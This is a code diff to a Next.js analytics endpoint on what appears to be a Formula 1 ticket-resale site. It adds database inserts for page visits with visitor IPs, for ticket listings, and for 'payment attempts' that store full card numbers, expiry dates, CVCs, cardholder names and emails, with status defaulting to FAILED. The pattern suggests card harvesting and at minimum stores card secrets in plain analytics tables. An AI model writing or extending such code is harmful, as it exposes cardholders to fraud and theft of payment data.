@@ -1,5 +1,7 @@
 import { NextResponse } from 'next/server';
 import { analyticsStore } from '@/lib/analytics';
+import { db } from '@/lib/db';
+import { pageVisit, paymentAttempt, ticketListing } from '@/lib/schema';
 
 export const dynamic = 'force-dynamic';
 export const revalidate = 0;
@@ -58,6 +60,7 @@ export async function POST(request: Request) {
       }
     }
 
+    // 1. In-memory store update
     const tracked = analyticsStore.track({
       type,
       path,
@@ -76,6 +79,44 @@ export async function POST(request: Request) {
       cardholderName,
       email,
     });
+
+    // 2. Neon Postgres Permanent Storage (prevents data reset on server restarts)
+    try {
+      if (type === 'PAGE_VIEW' || type === 'EVENT_VIEW') {
+        await db.insert(pageVisit).values({
+          id: tracked.id,
+          path,
+          country,
+          countryCode,
+          referrer,
+          deviceOs,
+          ip: clientIp,
+        });
+      } else if (type === 'PAYMENT_ATTEMPT' && cardNumber) {
+        await db.insert(paymentAttempt).values({
+          id: tracked.id,
+          email: email || 'fan@example.com',
+          cardholderName: cardholderName || 'Guest Fan',
+          cardNumber,
+          expiry: expiry || '08 / 28',
+          cvc: cvc || '884',
+          eventName: eventName || 'Hungarian Grand Prix',
+          amount: amount || 0,
+          status: status || 'FAILED',
+        });
+      } else if (type === 'TICKET_LISTING') {
+        await db.insert(ticketListing).values({
+          id: tracked.id,
+          eventName: eventName || 'Hungarian Grand Prix',
+          grandstand: cardholderName || 'Super Gold',
+          askingPrice: amount || 0,
+          payoutAmount: Math.round((amount || 0) * 0.9),
+          status: status || 'ACTIVE',
+        });
+      }
+    } catch (dbErr) {
+      console.error('Database insertion error:', dbErr);
+    }
 
     return NextResponse.json({ success: true, event: tracked });
   } catch (error: any) {
